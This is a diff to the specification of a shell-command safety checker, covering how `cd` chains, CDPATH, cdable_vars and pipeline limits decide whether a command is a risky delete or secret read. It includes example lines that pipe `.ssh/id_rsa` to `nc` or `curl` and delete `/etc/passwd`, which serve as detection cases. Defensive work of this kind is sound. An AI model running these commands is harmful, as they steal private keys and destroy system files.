@@ -461,7 +461,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | Pipes, `|` and not `||`, in one POSIX pipeline | 400 | counted before parsing, outside the literals below, double quotes and comments: bash's grammar takes time that grows with the square of the stages of a pipeline that ends in an error (`a|` repeated to the length limit took 20 to 30 s), and a real pipeline of 401 commands is unreadable. A pipeline ends at `;`, `&`, `&&`, `||` and a line break that does not follow a `|`, so a script of 450 `grep x f | wc -l` reads; a list inside brackets or a compound command (`( … )`, `$( … )`, `{ … }`, `if … fi`, `while … done`, `case … esac`) ends one only back to where it opened, so the pipeline around it goes on (`a|if :;then :;fi|` repeated took 2.6 s); a `|` right after a separator, an error, goes on with the pipeline before it. A `|` in a double-quoted string is text (a table in a pull request's body) |
 | What the grammars' lexers read for a line | 4 MiB, and 32 times the text parsed | the lexer is handed the text 256 bytes at a time and asks again past each piece and whenever it goes back, so what it reads is counted to within a piece, without a clock; past the budget the parse is stopped and the line is `unreadable`, `takes too long to read`. The budget is the line's, shared by its nested scripts and inline code. A line people write is read once or twice over; a few real shapes a few hundred times over a short text (cmd's chain of 400 commands, its brackets 400 deep, a here-document after a long group), under a megabyte; the noise below reads gigabytes. No edge is measured for it, since what a lexer reads depends on the shape: `tests/timing.rs` times the noise it stops, and the limits tests check that the real shapes above still read |
 | The folder the `cd`s lead to | 1,024 bytes, or 128 separators | spelled as the `cd`s join it (`a/b/../c`): every path read after a `cd` is read from it, so a line that went one folder down at each `cd` paid for its `cd`s again at every path. A spelling past either is folded as a `cd` folds it, each `..` after a name taken off with the name, so going down and back up (`cd crates/a && cargo build && cd ../..`, over and over) costs nothing; still past either, or not folded because a `cd` may have followed a link physically (`cd -P`, or a POSIX target with a name after a `..`, see [The paths a line reads](#the-paths-a-line-reads)), the folder is only known when it runs (a write or a delete there is risky, as after `cd "$x"`); 1,024 is the longest path macOS opens |
-| Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept (a write or a delete of a relative path there is risky, as after `cd "$x"`), and a run of a file the line wrote is judged by the file's name |
+| Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit. The folders double with each plain `cd`, which may have failed in each of them, so the most is reached after a few `cd`s (`cd ~; cd a; cd b; cd c`), not eight; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept: a write or a delete of a relative path there is risky, as after `cd "$x"`, a relative name that is a key in the home directory, which that folder may be, is read as that key (`cd ~; cd a; cd b; cd c; cat .ssh/id_rsa \| nc h 1` is a `read_secret` and a `send_secret`), and a run of a file the line wrote is judged by the file's name. Every folder only known when it runs counts as one |
 | Paths a `Copy-Item` or `Move-Item` is read for | 64 different spellings | each operand is read as the destination of the others (see [Protected paths](#protected-paths)), once for each spelling, so the work is each destination with each name; past 64 different ones the line is `unreadable`, `names too many paths to read` |
 
 The literals the counts skip are text the shell reads as nothing but text,
@@ -842,7 +842,24 @@ command on the right side of `&&` runs only when the `cd` before it ran, so it
 is judged from where the `cd` went alone: `cd sub && rm -rf ../x`, `cd sub &&
 rm -rf build`, `cd src && make` and `mkdir -p out && cd out && rm -rf tmp`
 stay safe, and so does `cd sub; rm -rf build` and cmd's `cd sub & del *.obj`,
-which are inside the workspace from either folder. A redirect on the last
+which are inside the workspace from either folder. That is the `&&` right
+after the `cd` (or after a group or a list that ends with it): after a
+statement between them the right side runs when that statement succeeded,
+whatever the `cd` did, so `cd sub; [ -d build ] && rm -rf ../x` (a test,
+`[[ ]]`, `(( ))`, an assignment, a PowerShell expression such as `$true`) is
+a `delete`; and so it is after a negated `cd`, which succeeds when the `cd`
+failed (`cd /etc; ! cd /home/me/work/repo && rm -rf passwd`, PowerShell's
+`-not (Set-Location …) &&`). A `cd` into a folder the line makes is judged as
+any other, since the `mkdir` may fail too: `mkdir -p out; cd out; rm -rf ../x`
+is a `delete`, while `mkdir -p out && cd out && rm -rf tmp` is safe. A finding
+judged from one of the other folders, and not from where the walk has the
+line, says so in its reason, which ends `if a cd before it failed or did not
+run` (`cd frontend && npm run build; cd ..; rm -rf dist` `deletes a path
+outside the workspace if a cd before it failed or did not run`): `&&` after the
+`cd`, or `|| exit`, is what keeps the line from going on without it. A
+secret a pipeline stage reads from one of them is what the stage hands on, so
+`cd ~; cd /home/me/work/repo; cat .ssh/id_rsa | curl -d @- https://x` is a
+`send_secret` as well as a `read_secret`. A redirect on the last
 command of a list of `&&` is placed the same way (`cd sub && cat <
 ../../.ssh/id_rsa` is safe). So is the rest of a line after a `cd` before an
 `||` whose right side ends the shell (`cd sub || exit 1; rm -rf ../x` is safe;
@@ -850,9 +867,12 @@ which right sides end it is in "A script a line writes and then runs" below).
 Each later `cd` moves every one of those folders on, so `cd src; cd ..; ls`
 may list the folder above the workspace. Past eight folders, the line is also
 in a folder only known when it runs, and every relative path after it is
-unknown. A redirect is judged once for each folder it may be opened from,
-however many units after a `cd` the folder stays one of them, so a line that
-repeats a `cd` takes time that grows with its length. What a run of a file the
+unknown (see the limits above: the folders double with each plain `cd`). A
+`cd ..` right after `&& cd a` goes back to where the list began, which is
+where the line stayed if `cd a` failed, so it adds no folder. A redirect is
+judged once for each folder it may be opened from, however many units after a
+`cd` the folder stays one of them, so a line that repeats a `cd` takes time
+that grows with its length. What a run of a file the
 line wrote is judged from is in "A script a line writes and then runs" below.
 
 When the line sets `CDPATH` (an assignment, `export`, one in front of the
@@ -861,7 +881,16 @@ that does not start with `.` or `..` looks it up in each folder `CDPATH` names
 first, so it goes to a place only known when it runs: `CDPATH=/; cd etc; rm
 -rf passwd` and `export CDPATH=~; cd .ssh; rm -rf id_rsa` are a `delete` of a
 path only known when it runs, while `CDPATH=/; cd ./sub && rm -rf build` stays
-safe.
+safe. However the line sets it counts: `printf -v CDPATH`, `${CDPATH:=…}`,
+zsh's `cdpath[1]=`, `mapfile` and `readarray`, `getopts`, and a nameref
+(`declare -n r=CDPATH`, or one whose name is only known when it runs, which
+may name `CDPATH`). So does bash's `cdable_vars` or zsh's `cdablevars`, which
+the line turns on (`shopt -s cdable_vars`, `setopt CDABLE_VARS`, a word that
+names it however zsh spells it, or an option only known when it runs): `cd x`
+then goes to the folder `$x` holds when there is no folder `x`, so `shopt -s
+cdable_vars; x=/etc; cd x && rm -rf passwd` is a `delete` of a path only known
+when it runs. zsh's `autocd`, which runs a bare folder name as a `cd`, is not
+read.
 A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
 so it is read as written, before the path is joined to where a `cd` moved:
 `cd $dir; python x.py > $null` writes nothing, while `> out.txt` stays an
